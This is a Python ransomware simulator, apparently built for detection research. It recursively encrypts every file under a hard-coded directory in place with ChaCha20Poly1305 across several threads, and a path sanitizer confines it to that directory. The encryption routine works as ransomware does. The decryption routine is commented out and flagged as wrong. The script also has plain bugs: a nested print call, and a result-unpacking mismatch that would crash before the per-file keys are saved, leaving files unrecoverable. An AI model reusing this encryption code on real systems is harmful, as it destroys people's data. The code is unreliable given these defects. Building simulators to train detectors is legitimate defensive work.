# What this script does:

# Phase 1: It will create a directory with multiple folders and files in it.

# sleep for 10 sec 

# phase 2: It will simulate a ransomware attack by encrypting the files in the created folders using ChaCha20Poly1305 symmetric encryption.

# TODO:  Correct the decryption logic and nonce.

# TODO: maybe add more encryption algorithms to simulate different ransomware attacks.


# In the specified directory, it will first create multiple folders and in each folder it will create some files. 
# Then simulated ransomware will open -> read -> encrypt -> close the files in each folder.

# TODO: Try to make 2 simulations. One for fast attack and 2nd for slow attack.





import os
from cryptography.hazmat.primitives.ciphers.aead import ChaCha20Poly1305
import concurrent.futures




TARGET_DIR = r"C:\projects\ransomware_detection\Zero-Day-Ransomware-detection-\src\data\Original_simulated_dir_backup"
# key = ChaCha20Poly1305.generate_key()





class PathSanitizer:
    def __init__(self, allowed_root_dir):
        # Resolve the allowed root directory to its real, absolute canonical path
        self.allowed_root = os.path.realpath(allowed_root_dir)
        
        # Standard system exclusion keywords (lowercased for uniform matching)
        self.system_blocklist = [
            r"c:\windows", 
            r"system32", 
            r"syswow64", 
            r"program files", 
            r"program files (x86)", 
            r"programdata", 
            r"users\all users", 
            r"\boot", 
            r"efi"
        ]

    def is_safe(self, target_path):
        """
        Validates that a path is completely canonicalized, resides strictly inside 
        the allowed directory hierarchy, and does not touch critical system files.
        """
        try:
            # Step 1: Resolve symlinks, '..', and relative elements to get the absolute path
            canonical_path = os.path.realpath(target_path)
            canonical_path_lower = canonical_path.lower()
            
            # Step 2: Strict OS Blocklist Check
            for block_keyword in self.system_blocklist:
                if block_keyword in canonical_path_lower:
                    print(f"[SECURITY BLOCKED] Critical system path keyword detected: {target_path}")
                    return False
                    
            # Step 3: Boundary Containment Validation
            common = os.path.commonpath([self.allowed_root, canonical_path])
            if common != self.allowed_root:
                print(f"[SECURITY BLOCKED] Directory traversal attempt detected: {target_path}")
                return False
                
            return True
        except Exception as e:
            print(f"[ERROR] Path validation failed for {target_path}: {e}")
            return False




def encrypt_file_in_place(filepath, chunk_size=64 * 1024):
    """Encrypts a single file in-place using a reverse-chunking pattern."""
    try:
        key = ChaCha20Poly1305.generate_key()
        chacha = ChaCha20Poly1305(key)
        
        base_nonce = os.urandom(12)
        base_nonce_int = int.from_bytes(base_nonce, "big")
        
        file_size = os.path.getsize(filepath)
        if file_size == 0:
            return key  # Skip empty files but generate a valid key
            
        total_chunks = (file_size + chunk_size - 1) // chunk_size

        with open(filepath, "r+b") as f:
            # 1. Pre-allocate space at the tail end
            extra_bytes_needed = (total_chunks * 16) + 12
            f.seek(file_size + extra_bytes_needed - 1)
            f.write(b"\x00") 
            
            # 2. Process chunks backwards to prevent data overwrites
            for chunk_index in reversed(range(total_chunks)):
                read_pos = chunk_index * chunk_size
                f.seek(read_pos)
                
                current_chunk_size = min(chunk_size, file_size - read_pos)
                chunk = f.read(current_chunk_size)
                
                chunk_nonce = (base_nonce_int + chunk_index).to_bytes(12, "big")
                encrypted_chunk = chacha.encrypt(chunk_nonce, chunk, associated_data=None)
                
                write_pos = read_pos + (chunk_index * 16) + 12
                f.seek(write_pos)
                f.write(encrypted_chunk)
                
            # 3. Write base nonce to the start
            f.seek(0)
            f.write(base_nonce)

        print(print(f"Successfully encrypted: {filepath}"))
        return key
        
    except Exception as e:
        print(f"Error encrypting {filepath}: {e}")
        return None




# def decrypt_file_in_place(filepath, key, chunk_size=64 * 1024):
#     """Decrypts an in-place encrypted file by reading forward from beginning to end."""
#     chacha = ChaCha20Poly1305(key)
#     encrypted_chunk_size = chunk_size + 16
    
#     with open(filepath, "r+b") as f:
#         # Step 1: Read the 12-byte base nonce from the start
#         f.seek(0)
#         base_nonce = f.read(12)
#         base_nonce_int = int.from_bytes(base_nonce, "big")
        
#         # Keep track of where we are reading and writing
#         read_offset = 12
#         write_offset = 0
#         chunk_index = 0
        
#         while True:
#             # Move to the current reading position
#             f.seek(read_offset)
#             encrypted_chunk = f.read(encrypted_chunk_size)
#             if not encrypted_chunk:
#                 break
                
#             read_offset += len(encrypted_chunk)
            
#             # Recreate nonce and decrypt
#             chunk_nonce = (base_nonce_int + chunk_index).to_bytes(12, "big")
#             decrypted_chunk = chacha.decrypt(chunk_nonce, encrypted_chunk, associated_data=None)
            
#             # Jump back to write the smaller plaintext data over the old data
#             f.seek(write_offset)
#             f.write(decrypted_chunk)
#             write_offset += len(decrypted_chunk)
            
#             chunk_index += 1
            
#         # Step 2: Truncate the file to remove the trailing garbage/dead space
#         f.seek(write_offset)
#         f.truncate()



def traverse_and_encrypt(directory,max_workers=4):
    """Recursively walks a directory to encrypt files in-place and returns key mappings."""

    sanitizer = PathSanitizer(allowed_root_dir=directory)
    file_list = []
    
    # Discovery Phase: Walk the directory sequentially to find targets safely
    def traverse(current_dir):
        try:
            with os.scandir(current_dir) as entries:
                for entry in entries:
                    if entry.is_dir(follow_symlinks=False):
                        traverse(entry.path)
                    elif entry.is_file():
                        if sanitizer.is_safe(entry.path):
                            file_list.append(entry.path)
                        else:
                            print(f"  [SKIP] Skipping unsafe path execution: {entry.path}")
        except PermissionError:
            print(f"Permission denied accessing directory: {current_dir}")



    traverse(sanitizer.allowed_root)    
    key_manifest = {}

    
    # Execution Phase: Distribute discovered files across the thread pool
    print(f"Starting concurrent processing with {max_workers} threads across {len(file_list)} files...")
    with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as executor:
        # Submit all tasks to the pool
        future_to_file = {executor.submit(encrypt_file_in_place, path): path for path in file_list}
        
        # Collect results as they finish
        for future in concurrent.futures.as_completed(future_to_file):
            path, file_key = future.result()
            if file_key:
                key_manifest[path] = file_key
                
    return key_manifest



if __name__ == "__main__":
    target_directory = TARGET_DIR
    
    # Run the traversal and collect encryption keys
    all_keys = traverse_and_encrypt(target_directory,max_workers=4)
    
    # Display keys (In production, save these to a secure, external location)
    print("\nEncryption Key Manifest Summary:")
    for path, key in all_keys.items():
        print(f"{path}: {key.hex()}")    
